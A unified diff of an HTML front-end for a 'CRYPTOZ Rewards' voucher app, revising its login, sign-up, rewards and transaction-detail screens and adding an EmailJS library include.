@@ -1,29 +1,29 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CRYPTOZ Rewards</title>
-  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
   <!-- Login Screen -->
   <div id="login-screen" class="screen">
     <div class="banner">CRYPTOZ</div>
-    <input type="email" id="login-email" placeholder="Email" required />
-    <input type="password" id="login-password" placeholder="Password" required />
+    <input type="email" id="login-email" placeholder="Email" />
+    <input type="password" id="login-password" placeholder="Password" />
     <button id="login-btn">Login</button>
     <button id="go-to-sign-up">Sign Up</button>
-    <p class="note">Forgot password?</p>
   </div>
 
   <!-- Sign-Up Screen -->
   <div id="sign-up-screen" class="screen hidden">
     <div class="banner">SIGN UP</div>
-    <input type="text" id="name" placeholder="Name" required />
-    <input type="email" id="sign-up-email" placeholder="Email" required />
-    <input type="password" id="sign-up-password" placeholder="Password" required />
-    <input type="password" id="confirm-password" placeholder="Confirm Password" required />
+    <input type="text" id="name" placeholder="Name" />
+    <input type="email" id="sign-up-email" placeholder="Email" />
+    <input type="password" id="sign-up-password" placeholder="Password" />
+    <input type="password" id="confirm-password" placeholder="Confirm Password" />
     <button id="sign-up-btn">Sign Up</button>
     <button class="back-btn">Back</button>
   </div>
@@ -31,21 +31,26 @@
   <!-- Rewards Screen -->
   <div id="rewards-screen" class="screen hidden">
     <div class="banner">REWARDS</div>
-    <input type="text" id="voucher-code" placeholder="Voucher Code" required />
-    <input type="number" id="amount" placeholder="Amount" readonly />
-    <input type="text" id="wallet-address" placeholder="Wallet Address" required />
-    <input type="email" id="business-email" placeholder="Business Email" required />
+    <input type="text" id="name-display" placeholder="Name" disabled />
+    <input type="email" id="email-display" placeholder="Email" disabled />
+    <input type="text" id="voucher-code" placeholder="Voucher Code" />
+    <input type="text" id="wallet-address" placeholder="Wallet Address" />
+    <input type="text" id="business-name" placeholder="Business Name" />
+    <input type="email" id="business-email" placeholder="Business Email" />
     <button id="submit-reward-btn">Submit</button>
     <button class="back-btn">Back</button>
   </div>
 
-  <!-- Transactions Screen -->
+  <!-- Transaction Screen -->
   <div id="transaction-screen" class="screen hidden">
-    <div class="banner">TRANSACTIONS</div>
-    <p><strong>Date:</strong> <span id="transaction-date"></span></p>
-    <p><strong>Amount:</strong> <span id="transaction-amount"></span></p>
+    <div class="banner">TRANSACTION DETAILS</div>
+    <p><strong>Name:</strong> <span id="transaction-name"></span></p>
+    <p><strong>Email:</strong> <span id="transaction-email"></span></p>
+    <p><strong>Voucher Code:</strong> <span id="transaction-voucher-code"></span></p>
     <p><strong>Wallet Address:</strong> <span id="transaction-wallet"></span></p>
-    <p class="note">Please check your email for details.</p>
+    <p><strong>Business Name:</strong> <span id="transaction-business-name"></span></p>
+    <p><strong>Business Email:</strong> <span id="transaction-business-email"></span></p>
+    <p class="note">Please allow a few days to process your voucher. Thank you.</p>
     <button class="back-btn">Back</button>
   </div>
 
